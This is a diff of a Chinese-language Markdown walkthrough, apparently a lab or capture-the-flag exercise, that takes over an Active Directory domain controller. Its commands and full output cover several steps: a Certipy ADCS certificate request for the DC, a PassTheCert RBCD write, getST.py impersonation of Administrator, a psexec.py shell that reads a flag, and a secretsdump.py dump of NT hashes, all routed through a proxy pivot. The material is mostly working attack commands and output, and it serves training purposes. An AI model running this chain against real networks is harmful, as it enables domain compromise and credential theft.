@@ -814,51 +814,35 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Successfully created account 'evil$' with password 'Qwer1234'
 ```
 
-使用该机器账户向 ADCS 服务器请求域控的证书：
-```bash
-proxychains4 -f /usr/local/etc/proxychains-24.conf -q certipy req \
-  -u 'EVILCOMPUTER1$@pentest.me' \
-  -p '123@#ABC' \
-  -dc-ip 172.24.7.3 \
-  -ca 'pentest-DC-CA' \
-  -template Machine \
-  -target-ip 172.24.7.3 \
-  -debug
-Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
-[+] DC host (-dc-host) not specified. Using domain as DC host
-[+] Nameserver: '172.24.7.3'
-[+] DC IP: '172.24.7.3'
-[+] DC Host: 'PENTEST.ME'
-[+] Target IP: '172.24.7.3'
-[+] Remote Name: '172.24.7.3'
-[+] Domain: 'PENTEST.ME'
-[+] Username: 'EVILCOMPUTER1$'
-[+] Generating RSA key
-[*] Requesting certificate via RPC
-[+] Trying to connect to endpoint: ncacn_np:172.24.7.3[\pipe\cert]
-[+] Connected to endpoint: ncacn_np:172.24.7.3[\pipe\cert]
-[*] Request ID is 11
-[*] Successfully requested certificate
-[*] Got certificate with DNS Host Name 'DC.pentest.me'
-[*] Certificate has no object SID
-[*] Try using -sid to set the object SID or see the wiki for more details
-[*] Saving certificate and private key to 'dc.pfx'
-[+] Attempting to write data to 'dc.pfx'
-File 'dc.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
-[+] Data written to 'dc.pfx'
-[*] Wrote certificate and private key to 'dc.pfx'
-```
-关键参数解释（Certipy 5.0.4 版本）
 
-| 参数                      | 作用                             | 为什么必须加                                            |
-| ----------------------- | ------------------------------ | ------------------------------------------------- |
-| `-target-ip 172.24.7.3` | 强制所有 RPC/LDAP/HTTP 请求直接发往这个 IP | 替代了`-no-dns`的核心功能，让 Certipy 不解析 CA 服务器的域名，直接连接 IP |
-| `-f`                    | 强制 proxychains 使用 fork 模式      | 提高对 Python 应用的兼容性，避免某些网络调用绕过代理                    |
+
 - Certipy 在 4.0 版本后正式改名为 `certipy-ad(仅在kali中，mac本地仍然是certipy)，但大量旧教程仍在使用 `certipy` 这个旧命令名，这是最普遍的坑。
 
 
-配置hosts，请求证书
+还原哈希失败
+```
+proxychains4 -f /usr/local/etc/proxychains-24.conf -q certipy auth -pfx dc.pfx -dc-ip 172.24.7.3 -debug
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
+[+] Nameserver: '172.24.7.3'
+[+] DC IP: '172.24.7.3'
+[+] DC Host: ''
+[+] Target IP: '172.24.7.3'
+[+] Remote Name: '172.24.7.3'
+[+] Domain: ''
+[+] Username: ''
+[*] Certificate identities:
+[*]     SAN DNS Host Name: 'DC.pentest.me'
+[*] Using principal: 'dc$@pentest.me'
+[*] Trying to get TGT...
+[+] Sending AS-REQ to KDC pentest.me (172.24.7.3)
+[-] Authentication failed: [Errno Connection error (172.24.7.3:88)] [Errno 61] Connection refused
+```
+
+
+使用该机器账户向 ADCS 服务器请求域控的证书：
 ```bash
 proxychains4 -f /usr/local/etc/proxychains-24.conf certipy req \
     -u 'evil$@pentest.me' \
@@ -898,43 +882,128 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'dc.pfx'
 ```
 
-
-
-用申请到的域控的证书，向 KDC 请求域控的 TGT 并获取哈希：
+whoami，证明我们确实可以继续往下打了
 ```
-☁  endless  PROXYCHAINS_CONF_FILE=/etc/proxychains4-24.conf proxychains4 -f -q certipy-ad auth \
-  -pfx dc.pfx \
-  -user 'dc$' \
-  -domain pentest.me \
-  -dc-ip 172.24.7.3 \
-  -ns 172.24.7.3 \
-  -dns-tcp \
-  -ldap-shell \
-  -print \
-  -debug
-[proxychains] config file found: /etc/proxychains4-24.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+proxychains4 -f /usr/local/etc/proxychains-24.conf \
+/Users/zhaochoudemao/.local/pipx/venvs/certipy-ad/bin/python3 \
+/tmp/PassTheCert/Python/passthecert.py \
+-action whoami \
+-crt test.crt \
+-key test.key \
+-domain pentest.me \
+-dc-ip 172.24.7.3
+[proxychains] config file found: /usr/local/etc/proxychains-24.conf
+[proxychains] preloading /usr/local/Cellar/proxychains-ng/4.17/lib/libproxychains4.dylib
 [proxychains] DLL init: proxychains-ng 4.17
-Certipy v5.0.4 - by Oliver Lyak (ly4k)
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
 
-[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
-[+] Nameserver: '172.24.7.3'
-[+] DC IP: '172.24.7.3'
-[+] DC Host: ''
-[+] Target IP: '172.24.7.3'
-[+] Remote Name: '172.24.7.3'
-[+] Domain: ''
-[+] Username: 'DC$'
-[*] Certificate identities:
-[*]     SAN DNS Host Name: 'DC.pentest.me'
-[+] Authenticating to LDAP server using Schannel authentication
-[*] Connecting to 'ldaps://172.24.7.3:636'
-[proxychains] Strict chain  ...  101.132.149.233:6001  ...  172.24.7.3:636  ...  OK
-[*] Authenticated to '172.24.7.3' as: 'u:PENTEST\\DC$'
-[+] Bound to ldaps://172.24.7.3:636 - ssl
-[+] Default path: DC=pentest,DC=me
-[+] Configuration path: CN=Configuration,DC=pentest,DC=me
-Type help for list of commands
+[proxychains] Dynamic chain  ...  101.132.149.233:6001  ...  172.24.7.3:636  ...  OK
+[*] You are logged in as: PENTEST\DC$
+```
 
-# 
+下一步将证书配置到域控的 RBCD(这里需要把dc加到hosts里)
+```bash
+proxychains4 -f /usr/local/etc/proxychains-24.conf \
+/Users/zhaochoudemao/.local/pipx/venvs/certipy-ad/bin/python3 \
+/tmp/PassTheCert/Python/passthecert.py \
+-action write_rbcd \
+-crt test.crt \
+-key test.key \
+-domain pentest.me \
+-dc-ip 172.24.7.3 \
+-delegate-to 'dc$' \
+-delegate-from 'EVILCOMPUTER1$'
+[proxychains] config file found: /usr/local/etc/proxychains-24.conf
+[proxychains] preloading /usr/local/Cellar/proxychains-ng/4.17/lib/libproxychains4.dylib
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[proxychains] Dynamic chain  ...  101.132.149.233:6001  ...  172.24.7.3:636  ...  OK
+[*] Accounts allowed to act on behalf of other identity:
+[*]     MYEVILPC$    (S-1-5-21-3745972894-1678056601-2622918667-1155)
+[*] Delegation rights modified successfully!
+[*] EVILCOMPUTER1$ can now impersonate users on dc$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     MYEVILPC$    (S-1-5-21-3745972894-1678056601-2622918667-1155)
+[*]     EVILCOMPUTER1$   (S-1-5-21-3745972894-1678056601-2622918667-1153)
+```
+
+python3 psexec.py  :当前目录找文件 + Python 3.14
+psexec.py : PATH 里找 + shebang 指向 3.13
+
+申请ST
+```bash
+proxychains4 -f /usr/local/etc/proxychains-24.conf \
+getST.py pentest.me/'EVILCOMPUTER1$':'123@#ABC' \
+-spn cifs/dc.pentest.me \
+-impersonate Administrator \
+-dc-ip 172.24.7.3
+[proxychains] config file found: /usr/local/etc/proxychains-24.conf
+[proxychains] preloading /usr/local/Cellar/proxychains-ng/4.17/lib/libproxychains4.dylib
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[proxychains] Dynamic chain  ...  101.132.149.233:6001  ...  172.24.7.3:88  ...  OK
+[proxychains] Dynamic chain  ...  101.132.149.233:6001  ...  172.24.7.3:88  ...  OK
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[proxychains] Dynamic chain  ...  101.132.149.233:6001  ...  172.24.7.3:88  ...  OK
+[*] Requesting S4U2Proxy
+[proxychains] Dynamic chain  ...  101.132.149.233:6001  ...  172.24.7.3:88  ...  OK
+[*] Saving ticket in Administrator@cifs_dc.pentest.me@PENTEST.ME.ccache
+```
+
+导入凭据
+```bash
+export KRB5CCNAME=Administrator@cifs_dc.pentest.me@PENTEST.ME.ccache
+```
+
+连接上去
+```bash
+proxychains4 -f /usr/local/etc/proxychains-24.conf -q psexec.py pentest.me/Administrator@dc.pentest.me -k -no-pass -dc-ip 172.24.7.3
+/Users/zhaochoudemao/.local/pipx/venvs/impacket/lib/python3.13/site-packages/impacket/version.py:12: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
+  import pkg_resources
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on dc.pentest.me.....
+[*] Found writable share ADMIN$
+[*] Uploading file HEYbeEeq.exe
+[*] Opening SVCManager on dc.pentest.me.....
+[*] Creating service QYQV on dc.pentest.me.....
+[*] Starting service QYQV.....
+[!] Press help for extra shell commands
+[-] Decoding error detected, consider running chcp.com at the target,
+map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+and then execute smbexec.py again with -codec and the corresponding codec
+Microsoft Windows [�汾 10.0.14393]
+
+[-] Decoding error detected, consider running chcp.com at the target,
+map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
+and then execute smbexec.py again with -codec and the corresponding codec
+(c) 2016 Microsoft Corporation����������Ȩ����
+
+
+C:\windows\system32> type  C:\Users\Administrator\Desktop\flag.txt
+flag{congratulations_get_DC!}
+C:\windows\system32> 
+```
+
+dump哈希
+```bash
+proxychains4 -f /usr/local/etc/proxychains-24.conf  secretsdump.py -k -no-pass Administrator@dc.pentest.me -dc-ip 172.24.7.3
+[proxychains] config file found: /usr/local/etc/proxychains-24.conf
+[proxychains] preloading /usr/local/Cellar/proxychains-ng/4.17/lib/libproxychains4.dylib
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] DLL init: proxychains-ng 4.17
+[proxychains] Dynamic chain  ...  101.132.149.233:6001  ...  dc.pentest.me:445  ...  OK
+[*] Service RemoteRegistry is in stopped state
+[*] Starting service RemoteRegistry
+[*] Target system bootKey: 0x3d0b51771c180c3bfcb89c8258922751
+[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:4dc9ff49be7d750c2ddc4bb297296fb5:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 ```
